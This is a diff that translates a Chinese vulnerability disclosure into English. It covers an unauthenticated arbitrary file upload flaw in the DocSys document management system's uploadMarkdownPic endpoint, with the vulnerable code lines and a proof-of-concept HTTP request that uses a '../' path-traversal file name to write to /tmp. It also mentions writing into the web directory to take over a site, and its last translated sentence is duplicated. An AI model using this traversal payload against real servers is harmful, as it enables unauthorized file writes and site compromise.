@@ -1,50 +1,48 @@
-# DocSys-任意文件上传漏洞
+# DocSys-Arbitrary file upload vulnerability
 
-## 漏洞描述
+## Vulnerability Description
 
-DocSys-master 是一款文档管理系统。其认证src/com/DocSystem/controller/DocController.java的uploadMarkdownPic接口存在任意文件上传漏洞：
+DocSys-master is a document management system. Its authenticated uploadMarkdownPic interface in src/com/DocSystem/controller/DocController.java has an arbitrary file upload vulnerability:
 
 ---
 
-## 影响版本
+## Affected Versions
 
-DocSys-master（最新版本）
+DocSys-master（latest version）V2.02.85
 
 [DocSys_V2.02.85](https://gitee.com/RainyGao/DocSys/releases/tag/DocSys_V2.02.85)
 
 ---
 
-## 利用条件
+## Utilize conditions
 
-- 远程访问
-- 无需登录
+- remote access
+- No login required
 
 ---
 
-## 漏洞复现
+## Vulnerability Reproduction
 
-### 任意文件上传
+### Upload any file
 
-**文件路径**：`src/com/DocSystem/controller/DocController.java`
-**行号**：2019-2024
+**File path**：`src/com/DocSystem/controller/DocController.java`
+**line number**：2019-2024
 
-用户请求参数文件名String imgName和 文件内容MultipartFile file直接来自 HTTP 请求，用户可控
+The user request parameters, namely the String imgName and MultipartFile file, are directly obtained from the HTTP request and are controllable by the user
 
 ![image-20260803194710833](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803194710833.2dpeudmzqb.webp)
 
-行号: 2081-2088 — imgName 直接赋值给 fileName，无任何路径检测
-
- 行号: 2090-2095 — 创建目录（只创建 res/ 目录，不校验目标路径）
-
-行号: 2097 — 文件写入
+Line numbers: 2081-2088 — imgName is directly assigned to fileName without any path verification
+Line numbers: 2090-2095 — Create directory (only create the res/ directory, do not verify the target path)
+Line number: 2097 — File write
 
 ![image-20260803195014637](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803195014637.6f1e8rrdzl.webp)
 
 ---
 
-漏洞复现：
+Vulnerability Reproduction：
 
-**请求包**：前台文件上传
+**Request package**：Upload files at the front desk
 
 ```
 POST /DocSystem/Doc/uploadMarkdownPic.do?reposId=9&path=Lw&name=dGVzdC50eHQ&imgName=../../../../../../../../tmp/test2026.txt HTTP/1.1
@@ -65,7 +63,7 @@ test2026
 
 ![image-20260803183835811](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803183835811.96aggudw3o.webp)
 
-成功上传文件到/tmp/test2026.txt,可上传至web目录下获取网站权限
+The file has been successfully uploaded to /tmp/test2026.txt. You can upload it to the web directory to obtain website permissions. The file has been successfully uploaded to /tmp/test2026.txt. You can upload it to the web directory to obtain website permissions
 
 
 
